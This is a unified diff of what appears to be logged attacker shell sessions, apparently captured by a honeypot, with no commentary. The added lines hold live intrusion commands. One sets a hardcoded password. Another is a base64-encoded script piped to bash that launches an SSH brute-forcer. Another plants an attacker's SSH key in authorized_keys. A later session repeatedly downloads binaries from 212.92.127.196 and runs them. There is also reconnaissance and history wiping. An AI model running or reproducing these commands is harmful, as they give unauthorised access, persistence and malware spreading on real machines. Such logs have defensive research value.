@@ -1,22 +1,30 @@
 Session ID: 246820ce25d4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "sysmail\nGSZYg4u6KsHM\nGSZYg4u6KsHM"|passwd|bash
+echo "sysmail\nGSZYg4u6KsHM\nGSZYg4u6KsHM\n"|passwd
+echo "321" > /var/tmp/.var03522123
 rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
 }'
 free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
 ls -lh $(which ls)
 crontab -l
 w
 uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
 top
 uname
 uname -a
 lscpu | grep Model
+echo "admin sysmail" > /tmp/up.txt
 rm -rf /var/tmp/dota*
-sleep 15s
-cd /var/tmp
-cd ~
-rm -rf .ssh
-chmod -R go= ~/.ssh
-cd ~
+cat /var/tmp/.systemcache436621
+echo "1" > /var/tmp/.systemcache436621
+cat /var/tmp/.systemcache436621
+sleep 15s && cd /var/tmp
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 whoami
 
 Session ID: b07313db
@@ -47,6 +55,7 @@ ls
 ls /home/alexis/Videos
 ls /home/alexis/Downloads
 less Downloads/20161216_work.txt
+cat /home/alexis/Downloads/20161216_work.txt
 ls /home/alexis/Downloads
 ls
 ls /home/alexis/Pictures
@@ -94,51 +103,51 @@ Session ID: 69485d99
 wget http://212.92.127.196/.1 -O /tmp/..1
 wget1 http://212.92.127.196/.1 -O /tmp/..1
 chmod +x /tmp/..1
-/tmp/..1
+/tmp/..1 &
 wget http://212.92.127.196/.2 -O /tmp/..2
 wget1 http://212.92.127.196/.2 -O /tmp/..2
 chmod +x /tmp/..2
-/tmp/..2
+/tmp/..2 &
 wget http://212.92.127.196/.3 -O /tmp/..3
 wget1 http://212.92.127.196/.3 -O /tmp/..3
 chmod +x /tmp/..3
-/tmp/..3
+/tmp/..3 &
 wget http://212.92.127.196/.4 -O /tmp/..4
 wget1 http://212.92.127.196/.4 -O /tmp/..4
 chmod +x /tmp/..4
-/tmp/..4
+/tmp/..4 &
 wget http://212.92.127.196/.5 -O /tmp/..5
 wget1 http://212.92.127.196/.5 -O /tmp/..5
 chmod +x /tmp/..5
-/tmp/..5
+/tmp/..5 &
 wget http://212.92.127.196/.6 -O /tmp/..6
 wget1 http://212.92.127.196/.6 -O /tmp/..6
 chmod +x /tmp/..6
-/tmp/..6
+/tmp/..6 &
 wget http://212.92.127.196/.7 -O /tmp/..7
 wget1 http://212.92.127.196/.7 -O /tmp/..7
 chmod +x /tmp/..7
-/tmp/..7
+/tmp/..7 &
 wget http://212.92.127.196/.8 -O /tmp/..8
 wget1 http://212.92.127.196/.8 -O /tmp/..8
 chmod +x /tmp/..8
-/tmp/..8
+/tmp/..8 &
 wget http://212.92.127.196/.9 -O /tmp/..9
 wget1 http://212.92.127.196/.9 -O /tmp/..9
 chmod +x /tmp/..9
-/tmp/..9
+/tmp/..9 &
 wget http://212.92.127.196/.10 -O /tmp/..10
 wget1 http://212.92.127.196/.10 -O /tmp/..10
 chmod +x /tmp/..10
-/tmp/..10
+/tmp/..10 &
 wget http://212.92.127.196/.11 -O /tmp/..11
 wget1 http://212.92.127.196/.11 -O /tmp/..11
 chmod +x /tmp/..11
-/tmp/..11
+/tmp/..11 &
 wget http://212.92.127.196/.12 -O /tmp/..12
 wget1 http://212.92.127.196/.12 -O /tmp/..12
 chmod +x /tmp/..12
-/tmp/..12
+/tmp/..12 &
 
 Session ID: 68e36d03
 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
@@ -167,3 +176,4 @@ history -r
 uname
 free -m
 ps -x
+cat /proc/cpuinfo
